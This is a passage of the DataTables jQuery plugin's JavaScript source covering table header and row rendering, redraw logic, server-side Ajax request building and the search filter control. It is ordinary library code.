		// Remove once webkit bug 131819 and Chromium bug 365619 have been resolved

		// and deployed

		row.nTr.setAttribute( 'role', 'row' );

	}

	

	

	/**

	 * Add attributes to a row based on the special `DT_*` parameters in a data

	 * source object.

	 *  @param {object} settings DataTables settings object

	 *  @param {object} DataTables row object for the row to be modified

	 *  @memberof DataTable#oApi

	 */

	function _fnRowAttributes( settings, row )

	{

		var tr = row.nTr;

		var data = row._aData;

	

		if ( tr ) {

			var id = settings.rowIdFn( data );

	

			if ( id ) {

				tr.id = id;

			}

	

			if ( data.DT_RowClass ) {

				// Remove any classes added by DT_RowClass before

				var a = data.DT_RowClass.split(' ');

				row.__rowc = row.__rowc ?

					_unique( row.__rowc.concat( a ) ) :

					a;

	

				$(tr)

					.removeClass( row.__rowc.join(' ') )

					.addClass( data.DT_RowClass );

			}

	

			if ( data.DT_RowAttr ) {

				$(tr).attr( data.DT_RowAttr );

			}

	

			if ( data.DT_RowData ) {

				$(tr).data( data.DT_RowData );

			}

		}

	}

	

	

	/**

	 * Create the HTML header for the table

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnBuildHead( oSettings )

	{

		var i, ien, cell, row, column;

		var thead = oSettings.nTHead;

		var tfoot = oSettings.nTFoot;

		var createHeader = $('th, td', thead).length === 0;

		var classes = oSettings.oClasses;

		var columns = oSettings.aoColumns;

	

		if ( createHeader ) {

			row = $('<tr/>').appendTo( thead );

		}

	

		for ( i=0, ien=columns.length ; i<ien ; i++ ) {

			column = columns[i];

			cell = $( column.nTh ).addClass( column.sClass );

	

			if ( createHeader ) {

				cell.appendTo( row );

			}

	

			// 1.11 move into sorting

			if ( oSettings.oFeatures.bSort ) {

				cell.addClass( column.sSortingClass );

	

				if ( column.bSortable !== false ) {

					cell

						.attr( 'tabindex', oSettings.iTabIndex )

						.attr( 'aria-controls', oSettings.sTableId );

	

					_fnSortAttachListener( oSettings, column.nTh, i );

				}

			}

	

			if ( column.sTitle != cell[0].innerHTML ) {

				cell.html( column.sTitle );

			}

	

			_fnRenderer( oSettings, 'header' )(

				oSettings, cell, column, classes

			);

		}

	

		if ( createHeader ) {

			_fnDetectHeader( oSettings.aoHeader, thead );

		}

		

		/* ARIA role for the rows */

	 	$(thead).find('>tr').attr('role', 'row');

	

		/* Deal with the footer - add classes if required */

		$(thead).find('>tr>th, >tr>td').addClass( classes.sHeaderTH );

		$(tfoot).find('>tr>th, >tr>td').addClass( classes.sFooterTH );

	

		// Cache the footer cells. Note that we only take the cells from the first

		// row in the footer. If there is more than one row the user wants to

		// interact with, they need to use the table().foot() method. Note also this

		// allows cells to be used for multiple columns using colspan

		if ( tfoot !== null ) {

			var cells = oSettings.aoFooter[0];

	

			for ( i=0, ien=cells.length ; i<ien ; i++ ) {

				column = columns[i];

				column.nTf = cells[i].cell;

	

				if ( column.sClass ) {

					$(column.nTf).addClass( column.sClass );

				}

			}

		}

	}

	

	

	/**

	 * Draw the header (or footer) element based on the column visibility states. The

	 * methodology here is to use the layout array from _fnDetectHeader, modified for

	 * the instantaneous column visibility, to construct the new layout. The grid is

	 * traversed over cell at a time in a rows x columns grid fashion, although each

	 * cell insert can cover multiple elements in the grid - which is tracks using the

	 * aApplied array. Cell inserts in the grid will only occur where there isn't

	 * already a cell in that position.

	 *  @param {object} oSettings dataTables settings object

	 *  @param array {objects} aoSource Layout array from _fnDetectHeader

	 *  @param {boolean} [bIncludeHidden=false] If true then include the hidden columns in the calc,

	 *  @memberof DataTable#oApi

	 */

	function _fnDrawHead( oSettings, aoSource, bIncludeHidden )

	{

		var i, iLen, j, jLen, k, kLen, n, nLocalTr;

		var aoLocal = [];

		var aApplied = [];

		var iColumns = oSettings.aoColumns.length;

		var iRowspan, iColspan;

	

		if ( ! aoSource )

		{

			return;

		}

	

		if (  bIncludeHidden === undefined )

		{

			bIncludeHidden = false;

		}

	

		/* Make a copy of the master layout array, but without the visible columns in it */

		for ( i=0, iLen=aoSource.length ; i<iLen ; i++ )

		{

			aoLocal[i] = aoSource[i].slice();

			aoLocal[i].nTr = aoSource[i].nTr;

	

			/* Remove any columns which are currently hidden */

			for ( j=iColumns-1 ; j>=0 ; j-- )

			{

				if ( !oSettings.aoColumns[j].bVisible && !bIncludeHidden )

				{

					aoLocal[i].splice( j, 1 );

				}

			}

	

			/* Prep the applied array - it needs an element for each row */

			aApplied.push( [] );

		}

	

		for ( i=0, iLen=aoLocal.length ; i<iLen ; i++ )

		{

			nLocalTr = aoLocal[i].nTr;

	

			/* All cells are going to be replaced, so empty out the row */

			if ( nLocalTr )

			{

				while( (n = nLocalTr.firstChild) )

				{

					nLocalTr.removeChild( n );

				}

			}

	

			for ( j=0, jLen=aoLocal[i].length ; j<jLen ; j++ )

			{

				iRowspan = 1;

				iColspan = 1;

	

				/* Check to see if there is already a cell (row/colspan) covering our target

				 * insert point. If there is, then there is nothing to do.

				 */

				if ( aApplied[i][j] === undefined )

				{

					nLocalTr.appendChild( aoLocal[i][j].cell );

					aApplied[i][j] = 1;

	

					/* Expand the cell to cover as many rows as needed */

					while ( aoLocal[i+iRowspan] !== undefined &&

					        aoLocal[i][j].cell == aoLocal[i+iRowspan][j].cell )

					{

						aApplied[i+iRowspan][j] = 1;

						iRowspan++;

					}

	

					/* Expand the cell to cover as many columns as needed */

					while ( aoLocal[i][j+iColspan] !== undefined &&

					        aoLocal[i][j].cell == aoLocal[i][j+iColspan].cell )

					{

						/* Must update the applied array over the rows for the columns */

						for ( k=0 ; k<iRowspan ; k++ )

						{

							aApplied[i+k][j+iColspan] = 1;

						}

						iColspan++;

					}

	

					/* Do the actual expansion in the DOM */

					$(aoLocal[i][j].cell)

						.attr('rowspan', iRowspan)

						.attr('colspan', iColspan);

				}

			}

		}

	}

	

	

	/**

	 * Insert the required TR nodes into the table for display

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnDraw( oSettings )

	{

		/* Provide a pre-callback function which can be used to cancel the draw is false is returned */

		var aPreDraw = _fnCallbackFire( oSettings, 'aoPreDrawCallback', 'preDraw', [oSettings] );

		if ( $.inArray( false, aPreDraw ) !== -1 )

		{

			_fnProcessingDisplay( oSettings, false );

			return;

		}

	

		var i, iLen, n;

		var anRows = [];

		var iRowCount = 0;

		var asStripeClasses = oSettings.asStripeClasses;

		var iStripes = asStripeClasses.length;

		var iOpenRows = oSettings.aoOpenRows.length;

		var oLang = oSettings.oLanguage;

		var iInitDisplayStart = oSettings.iInitDisplayStart;

		var bServerSide = _fnDataSource( oSettings ) == 'ssp';

		var aiDisplay = oSettings.aiDisplay;

	

		oSettings.bDrawing = true;

	

		/* Check and see if we have an initial draw position from state saving */

		if ( iInitDisplayStart !== undefined && iInitDisplayStart !== -1 )

		{

			oSettings._iDisplayStart = bServerSide ?

				iInitDisplayStart :

				iInitDisplayStart >= oSettings.fnRecordsDisplay() ?

					0 :

					iInitDisplayStart;

	

			oSettings.iInitDisplayStart = -1;

		}

	

		var iDisplayStart = oSettings._iDisplayStart;

		var iDisplayEnd = oSettings.fnDisplayEnd();

	

		/* Server-side processing draw intercept */

		if ( oSettings.bDeferLoading )

		{

			oSettings.bDeferLoading = false;

			oSettings.iDraw++;

			_fnProcessingDisplay( oSettings, false );

		}

		else if ( !bServerSide )

		{

			oSettings.iDraw++;

		}

		else if ( !oSettings.bDestroying && !_fnAjaxUpdate( oSettings ) )

		{

			return;

		}

	

		if ( aiDisplay.length !== 0 )

		{

			var iStart = bServerSide ? 0 : iDisplayStart;

			var iEnd = bServerSide ? oSettings.aoData.length : iDisplayEnd;

	

			for ( var j=iStart ; j<iEnd ; j++ )

			{

				var iDataIndex = aiDisplay[j];

				var aoData = oSettings.aoData[ iDataIndex ];

				if ( aoData.nTr === null )

				{

					_fnCreateTr( oSettings, iDataIndex );

				}

	

				var nRow = aoData.nTr;

	

				/* Remove the old striping classes and then add the new one */

				if ( iStripes !== 0 )

				{

					var sStripe = asStripeClasses[ iRowCount % iStripes ];

					if ( aoData._sRowStripe != sStripe )

					{

						$(nRow).removeClass( aoData._sRowStripe ).addClass( sStripe );

						aoData._sRowStripe = sStripe;

					}

				}

	

				// Row callback functions - might want to manipulate the row

				// iRowCount and j are not currently documented. Are they at all

				// useful?

				_fnCallbackFire( oSettings, 'aoRowCallback', null,

					[nRow, aoData._aData, iRowCount, j, iDataIndex] );

	

				anRows.push( nRow );

				iRowCount++;

			}

		}

		else

		{

			/* Table is empty - create a row with an empty message in it */

			var sZero = oLang.sZeroRecords;

			if ( oSettings.iDraw == 1 &&  _fnDataSource( oSettings ) == 'ajax' )

			{

				sZero = oLang.sLoadingRecords;

			}

			else if ( oLang.sEmptyTable && oSettings.fnRecordsTotal() === 0 )

			{

				sZero = oLang.sEmptyTable;

			}

	

			anRows[ 0 ] = $( '<tr/>', { 'class': iStripes ? asStripeClasses[0] : '' } )

				.append( $('<td />', {

					'valign':  'top',

					'colSpan': _fnVisbleColumns( oSettings ),

					'class':   oSettings.oClasses.sRowEmpty

				} ).html( sZero ) )[0];

		}

	

		/* Header and footer callbacks */

		_fnCallbackFire( oSettings, 'aoHeaderCallback', 'header', [ $(oSettings.nTHead).children('tr')[0],

			_fnGetDataMaster( oSettings ), iDisplayStart, iDisplayEnd, aiDisplay ] );

	

		_fnCallbackFire( oSettings, 'aoFooterCallback', 'footer', [ $(oSettings.nTFoot).children('tr')[0],

			_fnGetDataMaster( oSettings ), iDisplayStart, iDisplayEnd, aiDisplay ] );

	

		var body = $(oSettings.nTBody);

	

		body.children().detach();

		body.append( $(anRows) );

	

		/* Call all required callback functions for the end of a draw */

		_fnCallbackFire( oSettings, 'aoDrawCallback', 'draw', [oSettings] );

	

		/* Draw is complete, sorting and filtering must be as well */

		oSettings.bSorted = false;

		oSettings.bFiltered = false;

		oSettings.bDrawing = false;

	}

	

	

	/**

	 * Redraw the table - taking account of the various features which are enabled

	 *  @param {object} oSettings dataTables settings object

	 *  @param {boolean} [holdPosition] Keep the current paging position. By default

	 *    the paging is reset to the first page

	 *  @memberof DataTable#oApi

	 */

	function _fnReDraw( settings, holdPosition )

	{

		var

			features = settings.oFeatures,

			sort     = features.bSort,

			filter   = features.bFilter;

	

		if ( sort ) {

			_fnSort( settings );

		}

	

		if ( filter ) {

			_fnFilterComplete( settings, settings.oPreviousSearch );

		}

		else {

			// No filtering, so we want to just use the display master

			settings.aiDisplay = settings.aiDisplayMaster.slice();

		}

	

		if ( holdPosition !== true ) {

			settings._iDisplayStart = 0;

		}

	

		// Let any modules know about the draw hold position state (used by

		// scrolling internally)

		settings._drawHold = holdPosition;

	

		_fnDraw( settings );

	

		settings._drawHold = false;

	}

	

	

	/**

	 * Add the options to the page HTML for the table

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnAddOptionsHtml ( oSettings )

	{

		var classes = oSettings.oClasses;

		var table = $(oSettings.nTable);

		var holding = $('<div/>').insertBefore( table ); // Holding element for speed

		var features = oSettings.oFeatures;

	

		// All DataTables are wrapped in a div

		var insert = $('<div/>', {

			id:      oSettings.sTableId+'_wrapper',

			'class': classes.sWrapper + (oSettings.nTFoot ? '' : ' '+classes.sNoFooter)

		} );

	

		oSettings.nHolding = holding[0];

		oSettings.nTableWrapper = insert[0];

		oSettings.nTableReinsertBefore = oSettings.nTable.nextSibling;

	

		/* Loop over the user set positioning and place the elements as needed */

		var aDom = oSettings.sDom.split('');

		var featureNode, cOption, nNewNode, cNext, sAttr, j;

		for ( var i=0 ; i<aDom.length ; i++ )

		{

			featureNode = null;

			cOption = aDom[i];

	

			if ( cOption == '<' )

			{

				/* New container div */

				nNewNode = $('<div/>')[0];

	

				/* Check to see if we should append an id and/or a class name to the container */

				cNext = aDom[i+1];

				if ( cNext == "'" || cNext == '"' )

				{

					sAttr = "";

					j = 2;

					while ( aDom[i+j] != cNext )

					{

						sAttr += aDom[i+j];

						j++;

					}

	

					/* Replace jQuery UI constants @todo depreciated */

					if ( sAttr == "H" )

					{

						sAttr = classes.sJUIHeader;

					}

					else if ( sAttr == "F" )

					{

						sAttr = classes.sJUIFooter;

					}

	

					/* The attribute can be in the format of "#id.class", "#id" or "class" This logic

					 * breaks the string into parts and applies them as needed

					 */

					if ( sAttr.indexOf('.') != -1 )

					{

						var aSplit = sAttr.split('.');

						nNewNode.id = aSplit[0].substr(1, aSplit[0].length-1);

						nNewNode.className = aSplit[1];

					}

					else if ( sAttr.charAt(0) == "#" )

					{

						nNewNode.id = sAttr.substr(1, sAttr.length-1);

					}

					else

					{

						nNewNode.className = sAttr;

					}

	

					i += j; /* Move along the position array */

				}

	

				insert.append( nNewNode );

				insert = $(nNewNode);

			}

			else if ( cOption == '>' )

			{

				/* End container div */

				insert = insert.parent();

			}

			// @todo Move options into their own plugins?

			else if ( cOption == 'l' && features.bPaginate && features.bLengthChange )

			{

				/* Length */

				featureNode = _fnFeatureHtmlLength( oSettings );

			}

			else if ( cOption == 'f' && features.bFilter )

			{

				/* Filter */

				featureNode = _fnFeatureHtmlFilter( oSettings );

			}

			else if ( cOption == 'r' && features.bProcessing )

			{

				/* pRocessing */

				featureNode = _fnFeatureHtmlProcessing( oSettings );

			}

			else if ( cOption == 't' )

			{

				/* Table */

				featureNode = _fnFeatureHtmlTable( oSettings );

			}

			else if ( cOption ==  'i' && features.bInfo )

			{

				/* Info */

				featureNode = _fnFeatureHtmlInfo( oSettings );

			}

			else if ( cOption == 'p' && features.bPaginate )

			{

				/* Pagination */

				featureNode = _fnFeatureHtmlPaginate( oSettings );

			}

			else if ( DataTable.ext.feature.length !== 0 )

			{

				/* Plug-in features */

				var aoFeatures = DataTable.ext.feature;

				for ( var k=0, kLen=aoFeatures.length ; k<kLen ; k++ )

				{

					if ( cOption == aoFeatures[k].cFeature )

					{

						featureNode = aoFeatures[k].fnInit( oSettings );

						break;

					}

				}

			}

	

			/* Add to the 2D features array */

			if ( featureNode )

			{

				var aanFeatures = oSettings.aanFeatures;

	

				if ( ! aanFeatures[cOption] )

				{

					aanFeatures[cOption] = [];

				}

	

				aanFeatures[cOption].push( featureNode );

				insert.append( featureNode );

			}

		}

	

		/* Built our DOM structure - replace the holding div with what we want */

		holding.replaceWith( insert );

		oSettings.nHolding = null;

	}

	

	

	/**

	 * Use the DOM source to create up an array of header cells. The idea here is to

	 * create a layout grid (array) of rows x columns, which contains a reference

	 * to the cell that that point in the grid (regardless of col/rowspan), such that

	 * any column / row could be removed and the new grid constructed

	 *  @param array {object} aLayout Array to store the calculated layout in

	 *  @param {node} nThead The header/footer element for the table

	 *  @memberof DataTable#oApi

	 */

	function _fnDetectHeader ( aLayout, nThead )

	{

		var nTrs = $(nThead).children('tr');

		var nTr, nCell;

		var i, k, l, iLen, jLen, iColShifted, iColumn, iColspan, iRowspan;

		var bUnique;

		var fnShiftCol = function ( a, i, j ) {

			var k = a[i];

	                while ( k[j] ) {

				j++;

			}

			return j;

		};

	

		aLayout.splice( 0, aLayout.length );

	

		/* We know how many rows there are in the layout - so prep it */

		for ( i=0, iLen=nTrs.length ; i<iLen ; i++ )

		{

			aLayout.push( [] );

		}

	

		/* Calculate a layout array */

		for ( i=0, iLen=nTrs.length ; i<iLen ; i++ )

		{

			nTr = nTrs[i];

			iColumn = 0;

	

			/* For every cell in the row... */

			nCell = nTr.firstChild;

			while ( nCell ) {

				if ( nCell.nodeName.toUpperCase() == "TD" ||

				     nCell.nodeName.toUpperCase() == "TH" )

				{

					/* Get the col and rowspan attributes from the DOM and sanitise them */

					iColspan = nCell.getAttribute('colspan') * 1;

					iRowspan = nCell.getAttribute('rowspan') * 1;

					iColspan = (!iColspan || iColspan===0 || iColspan===1) ? 1 : iColspan;

					iRowspan = (!iRowspan || iRowspan===0 || iRowspan===1) ? 1 : iRowspan;

	

					/* There might be colspan cells already in this row, so shift our target

					 * accordingly

					 */

					iColShifted = fnShiftCol( aLayout, i, iColumn );

	

					/* Cache calculation for unique columns */

					bUnique = iColspan === 1 ? true : false;

	

					/* If there is col / rowspan, copy the information into the layout grid */

					for ( l=0 ; l<iColspan ; l++ )

					{

						for ( k=0 ; k<iRowspan ; k++ )

						{

							aLayout[i+k][iColShifted+l] = {

								"cell": nCell,

								"unique": bUnique

							};

							aLayout[i+k].nTr = nTr;

						}

					}

				}

				nCell = nCell.nextSibling;

			}

		}

	}

	

	

	/**

	 * Get an array of unique th elements, one for each column

	 *  @param {object} oSettings dataTables settings object

	 *  @param {node} nHeader automatically detect the layout from this node - optional

	 *  @param {array} aLayout thead/tfoot layout from _fnDetectHeader - optional

	 *  @returns array {node} aReturn list of unique th's

	 *  @memberof DataTable#oApi

	 */

	function _fnGetUniqueThs ( oSettings, nHeader, aLayout )

	{

		var aReturn = [];

		if ( !aLayout )

		{

			aLayout = oSettings.aoHeader;

			if ( nHeader )

			{

				aLayout = [];

				_fnDetectHeader( aLayout, nHeader );

			}

		}

	

		for ( var i=0, iLen=aLayout.length ; i<iLen ; i++ )

		{

			for ( var j=0, jLen=aLayout[i].length ; j<jLen ; j++ )

			{

				if ( aLayout[i][j].unique &&

					 (!aReturn[j] || !oSettings.bSortCellsTop) )

				{

					aReturn[j] = aLayout[i][j].cell;

				}

			}

		}

	

		return aReturn;

	}

	

	/**

	 * Create an Ajax call based on the table's settings, taking into account that

	 * parameters can have multiple forms, and backwards compatibility.

	 *

	 * @param {object} oSettings dataTables settings object

	 * @param {array} data Data to send to the server, required by

	 *     DataTables - may be augmented by developer callbacks

	 * @param {function} fn Callback function to run when data is obtained

	 */

	function _fnBuildAjax( oSettings, data, fn )

	{

		// Compatibility with 1.9-, allow fnServerData and event to manipulate

		_fnCallbackFire( oSettings, 'aoServerParams', 'serverParams', [data] );

	

		// Convert to object based for 1.10+ if using the old array scheme which can

		// come from server-side processing or serverParams

		if ( data && $.isArray(data) ) {

			var tmp = {};

			var rbracket = /(.*?)\[\]$/;

	

			$.each( data, function (key, val) {

				var match = val.name.match(rbracket);

	

				if ( match ) {

					// Support for arrays

					var name = match[0];

	

					if ( ! tmp[ name ] ) {

						tmp[ name ] = [];

					}

					tmp[ name ].push( val.value );

				}

				else {

					tmp[val.name] = val.value;

				}

			} );

			data = tmp;

		}

	

		var ajaxData;

		var ajax = oSettings.ajax;

		var instance = oSettings.oInstance;

		var callback = function ( json ) {

			_fnCallbackFire( oSettings, null, 'xhr', [oSettings, json, oSettings.jqXHR] );

			fn( json );

		};

	

		if ( $.isPlainObject( ajax ) && ajax.data )

		{

			ajaxData = ajax.data;

	

			var newData = typeof ajaxData === 'function' ?

				ajaxData( data, oSettings ) :  // fn can manipulate data or return

				ajaxData;                      // an object object or array to merge

	

			// If the function returned something, use that alone

			data = typeof ajaxData === 'function' && newData ?

				newData :

				$.extend( true, data, newData );

	

			// Remove the data property as we've resolved it already and don't want

			// jQuery to do it again (it is restored at the end of the function)

			delete ajax.data;

		}

	

		var baseAjax = {

			"data": data,

			"success": function (json) {

				var error = json.error || json.sError;

				if ( error ) {

					_fnLog( oSettings, 0, error );

				}

	

				oSettings.json = json;

				callback( json );

			},

			"dataType": "json",

			"cache": false,

			"type": oSettings.sServerMethod,

			"error": function (xhr, error, thrown) {

				var ret = _fnCallbackFire( oSettings, null, 'xhr', [oSettings, null, oSettings.jqXHR] );

	

				if ( $.inArray( true, ret ) === -1 ) {

					if ( error == "parsererror" ) {

						_fnLog( oSettings, 0, 'Invalid JSON response', 1 );

					}

					else if ( xhr.readyState === 4 ) {

						_fnLog( oSettings, 0, 'Ajax error', 7 );

					}

				}

	

				_fnProcessingDisplay( oSettings, false );

			}

		};

	

		// Store the data submitted for the API

		oSettings.oAjaxData = data;

	

		// Allow plug-ins and external processes to modify the data

		_fnCallbackFire( oSettings, null, 'preXhr', [oSettings, data] );

	

		if ( oSettings.fnServerData )

		{

			// DataTables 1.9- compatibility

			oSettings.fnServerData.call( instance,

				oSettings.sAjaxSource,

				$.map( data, function (val, key) { // Need to convert back to 1.9 trad format

					return { name: key, value: val };

				} ),

				callback,

				oSettings

			);

		}

		else if ( oSettings.sAjaxSource || typeof ajax === 'string' )

		{

			// DataTables 1.9- compatibility

			oSettings.jqXHR = $.ajax( $.extend( baseAjax, {

				url: ajax || oSettings.sAjaxSource

			} ) );

		}

		else if ( typeof ajax === 'function' )

		{

			// Is a function - let the caller define what needs to be done

			oSettings.jqXHR = ajax.call( instance, data, callback, oSettings );

		}

		else

		{

			// Object to extend the base settings

			oSettings.jqXHR = $.ajax( $.extend( baseAjax, ajax ) );

	

			// Restore for next time around

			ajax.data = ajaxData;

		}

	}

	

	

	/**

	 * Update the table using an Ajax call

	 *  @param {object} settings dataTables settings object

	 *  @returns {boolean} Block the table drawing or not

	 *  @memberof DataTable#oApi

	 */

	function _fnAjaxUpdate( settings )

	{

		if ( settings.bAjaxDataGet ) {

			settings.iDraw++;

			_fnProcessingDisplay( settings, true );

	

			_fnBuildAjax(

				settings,

				_fnAjaxParameters( settings ),

				function(json) {

					_fnAjaxUpdateDraw( settings, json );

				}

			);

	

			return false;

		}

		return true;

	}

	

	

	/**

	 * Build up the parameters in an object needed for a server-side processing

	 * request. Note that this is basically done twice, is different ways - a modern

	 * method which is used by default in DataTables 1.10 which uses objects and

	 * arrays, or the 1.9- method with is name / value pairs. 1.9 method is used if

	 * the sAjaxSource option is used in the initialisation, or the legacyAjax

	 * option is set.

	 *  @param {object} oSettings dataTables settings object

	 *  @returns {bool} block the table drawing or not

	 *  @memberof DataTable#oApi

	 */

	function _fnAjaxParameters( settings )

	{

		var

			columns = settings.aoColumns,

			columnCount = columns.length,

			features = settings.oFeatures,

			preSearch = settings.oPreviousSearch,

			preColSearch = settings.aoPreSearchCols,

			i, data = [], dataProp, column, columnSearch,

			sort = _fnSortFlatten( settings ),

			displayStart = settings._iDisplayStart,

			displayLength = features.bPaginate !== false ?

				settings._iDisplayLength :

				-1;

	

		var param = function ( name, value ) {

			data.push( { 'name': name, 'value': value } );

		};

	

		// DataTables 1.9- compatible method

		param( 'sEcho',          settings.iDraw );

		param( 'iColumns',       columnCount );

		param( 'sColumns',       _pluck( columns, 'sName' ).join(',') );

		param( 'iDisplayStart',  displayStart );

		param( 'iDisplayLength', displayLength );

	

		// DataTables 1.10+ method

		var d = {

			draw:    settings.iDraw,

			columns: [],

			order:   [],

			start:   displayStart,

			length:  displayLength,

			search:  {

				value: preSearch.sSearch,

				regex: preSearch.bRegex

			}

		};

	

		for ( i=0 ; i<columnCount ; i++ ) {

			column = columns[i];

			columnSearch = preColSearch[i];

			dataProp = typeof column.mData=="function" ? 'function' : column.mData ;

	

			d.columns.push( {

				data:       dataProp,

				name:       column.sName,

				searchable: column.bSearchable,

				orderable:  column.bSortable,

				search:     {

					value: columnSearch.sSearch,

					regex: columnSearch.bRegex

				}

			} );

	

			param( "mDataProp_"+i, dataProp );

	

			if ( features.bFilter ) {

				param( 'sSearch_'+i,     columnSearch.sSearch );

				param( 'bRegex_'+i,      columnSearch.bRegex );

				param( 'bSearchable_'+i, column.bSearchable );

			}

	

			if ( features.bSort ) {

				param( 'bSortable_'+i, column.bSortable );

			}

		}

	

		if ( features.bFilter ) {

			param( 'sSearch', preSearch.sSearch );

			param( 'bRegex', preSearch.bRegex );

		}

	

		if ( features.bSort ) {

			$.each( sort, function ( i, val ) {

				d.order.push( { column: val.col, dir: val.dir } );

	

				param( 'iSortCol_'+i, val.col );

				param( 'sSortDir_'+i, val.dir );

			} );

	

			param( 'iSortingCols', sort.length );

		}

	

		// If the legacy.ajax parameter is null, then we automatically decide which

		// form to use, based on sAjaxSource

		var legacy = DataTable.ext.legacy.ajax;

		if ( legacy === null ) {

			return settings.sAjaxSource ? data : d;

		}

	

		// Otherwise, if legacy has been specified then we use that to decide on the

		// form

		return legacy ? data : d;

	}

	

	

	/**

	 * Data the data from the server (nuking the old) and redraw the table

	 *  @param {object} oSettings dataTables settings object

	 *  @param {object} json json data return from the server.

	 *  @param {string} json.sEcho Tracking flag for DataTables to match requests

	 *  @param {int} json.iTotalRecords Number of records in the data set, not accounting for filtering

	 *  @param {int} json.iTotalDisplayRecords Number of records in the data set, accounting for filtering

	 *  @param {array} json.aaData The data to display on this page

	 *  @param {string} [json.sColumns] Column ordering (sName, comma separated)

	 *  @memberof DataTable#oApi

	 */

	function _fnAjaxUpdateDraw ( settings, json )

	{

		// v1.10 uses camelCase variables, while 1.9 uses Hungarian notation.

		// Support both

		var compat = function ( old, modern ) {

			return json[old] !== undefined ? json[old] : json[modern];

		};

	

		var data = _fnAjaxDataSrc( settings, json );

		var draw            = compat( 'sEcho',                'draw' );

		var recordsTotal    = compat( 'iTotalRecords',        'recordsTotal' );

		var recordsFiltered = compat( 'iTotalDisplayRecords', 'recordsFiltered' );

	

		if ( draw !== undefined ) {

			// Protect against out of sequence returns

			if ( draw*1 < settings.iDraw ) {

				return;

			}

			settings.iDraw = draw * 1;

		}

	

		_fnClearTable( settings );

		settings._iRecordsTotal   = parseInt(recordsTotal, 10);

		settings._iRecordsDisplay = parseInt(recordsFiltered, 10);

	

		for ( var i=0, ien=data.length ; i<ien ; i++ ) {

			_fnAddData( settings, data[i] );

		}

		settings.aiDisplay = settings.aiDisplayMaster.slice();

	

		settings.bAjaxDataGet = false;

		_fnDraw( settings );

	

		if ( ! settings._bInitComplete ) {

			_fnInitComplete( settings, json );

		}

	

		settings.bAjaxDataGet = true;

		_fnProcessingDisplay( settings, false );

	}

	

	

	/**

	 * Get the data from the JSON data source to use for drawing a table. Using

	 * `_fnGetObjectDataFn` allows the data to be sourced from a property of the

	 * source object, or from a processing function.

	 *  @param {object} oSettings dataTables settings object

	 *  @param  {object} json Data source object / array from the server

	 *  @return {array} Array of data to use

	 */

	function _fnAjaxDataSrc ( oSettings, json )

	{

		var dataSrc = $.isPlainObject( oSettings.ajax ) && oSettings.ajax.dataSrc !== undefined ?

			oSettings.ajax.dataSrc :

			oSettings.sAjaxDataProp; // Compatibility with 1.9-.

	

		// Compatibility with 1.9-. In order to read from aaData, check if the

		// default has been changed, if not, check for aaData

		if ( dataSrc === 'data' ) {

			return json.aaData || json[dataSrc];

		}

	

		return dataSrc !== "" ?

			_fnGetObjectDataFn( dataSrc )( json ) :

			json;

	}

	

	/**

	 * Generate the node required for filtering text

	 *  @returns {node} Filter control element

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnFeatureHtmlFilter ( settings )

	{

		var classes = settings.oClasses;

		var tableId = settings.sTableId;

		var language = settings.oLanguage;

		var previousSearch = settings.oPreviousSearch;

		var features = settings.aanFeatures;

		var input = '<input type="search" class="'+classes.sFilterInput+'"/>';

	

		var str = language.sSearch;

		str = str.match(/_INPUT_/) ?

			str.replace('_INPUT_', input) :

			str+input;

	

		var filter = $('<div/>', {

				'id': ! features.f ? tableId+'_filter' : null,

				'class': classes.sFilter

			} )

			.append( $('<label/>' ).append( str ) );

	

		var searchFn = function() {

			/* Update all other filter input elements for the new display */

			var n = features.f;

			var val = !this.value ? "" : this.value; // mental IE8 fix :-(

	

			/* Now do the filter */

			if ( val != previousSearch.sSearch ) {

				_fnFilterComplete( settings, {

					"sSearch": val,

					"bRegex": previousSearch.bRegex,

					"bSmart": previousSearch.bSmart ,

					"bCaseInsensitive": previousSearch.bCaseInsensitive

				} );

	

				// Need to redraw, without resorting

				settings._iDisplayStart = 0;

				_fnDraw( settings );

			}

		};

	

		var searchDelay = settings.searchDelay !== null ?

			settings.searchDelay :

			_fnDataSource( settings ) === 'ssp' ?

				400 :

				0;

	

		var jqFilter = $('input', filter)

			.val( previousSearch.sSearch )

			.attr( 'placeholder', language.sSearchPlaceholder )

			.on(

				'keyup.DT search.DT input.DT paste.DT cut.DT',

				searchDelay ?

					_fnThrottle( searchFn, searchDelay ) :

					searchFn

			)

			.on( 'mouseup', function(e) {

				// Edge fix! Edge 17 does not trigger anything other than mouse events when clicking

				// on the clear icon (Edge bug 17584515). This is safe in other browsers as `searchFn`

				// checks the value to see if it has changed. In other browsers it won't have.

				setTimeout( function () {

					searchFn.call(jqFilter[0]);

				}, 10);

			} )

			.on( 'keypress.DT', function(e) {

				/* Prevent form submission */

				if ( e.keyCode == 13 ) {

					return false;

				}

			} )

			.attr('aria-controls', tableId);

	

		// Update the input elements whenever the table is filtered

		$(settings.nTable).on( 'search.dt.DT', function ( ev, s ) {

			if ( settings === s ) {

				// IE9 throws an 'unknown error' if document.activeElement is used

				// inside an iframe or frame...

				try {

					if ( jqFilter[0] !== document.activeElement ) {

						jqFilter.val( previousSearch.sSearch );

					}

				}

				catch ( e ) {}

			}

		} );

	

		return filter[0];

	}

	

	

	/**

	 * Filter the table using both the global filter and column based filtering

	 *  @param {object} oSettings dataTables settings object

	 *  @param {object} oSearch search information

	 *  @param {int} [iForce] force a research of the master array (1) or not (undefined or 0)

	 *  @memberof DataTable#oApi

	 */

	function _fnFilterComplete ( oSettings, oInput, iForce )

	{

		var oPrevSearch = oSettings.oPreviousSearch;

		var aoPrevSearch = oSettings.aoPreSearchCols;

		var fnSaveFilter = function ( oFilter ) {

			/* Save the filtering values */

			oPrevSearch.sSearch = oFilter.sSearch;

			oPrevSearch.bRegex = oFilter.bRegex;

			oPrevSearch.bSmart = oFilter.bSmart;

			oPrevSearch.bCaseInsensitive = oFilter.bCaseInsensitive;

		};

		var fnRegex = function ( o ) {

			// Backwards compatibility with the bEscapeRegex option

			return o.bEscapeRegex !== undefined ? !o.bEscapeRegex : o.bRegex;

		};

	

		// Resolve any column types that are unknown due to addition or invalidation

		// @todo As per sort - can this be moved into an event handler?

		_fnColumnTypes( oSettings );

	

		/* In server-side processing all filtering is done by the server, so no point hanging around here */

		if ( _fnDataSource( oSettings ) != 'ssp' )

		{

